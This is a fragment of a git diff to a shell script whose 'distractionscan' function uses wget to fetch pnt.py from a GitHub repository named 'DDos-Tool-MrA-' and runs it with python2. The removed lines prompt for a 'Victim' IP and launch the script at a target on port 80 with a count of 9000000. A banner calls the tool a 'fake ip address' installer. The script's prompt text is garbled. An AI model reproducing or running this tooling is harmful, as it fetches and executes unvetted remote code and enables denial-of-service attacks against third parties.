@@ -25,11 +25,9 @@ done
 ##WELCOME##
 #########################
 distractionscan()
-{
+{ 
 wget https://raw.githubusercontent.com/maellambong/DDos-Tool-MrA-/master/pnt.py
-read "please Enter Your i' Victim $ip : " IP
-if [ "$IP" = "$ip" ]; then
-python2 pnt.py $TARGET 80 9000000
+python2 pnt.py
 }
 
 echo "Welcome to install fake ip address!"
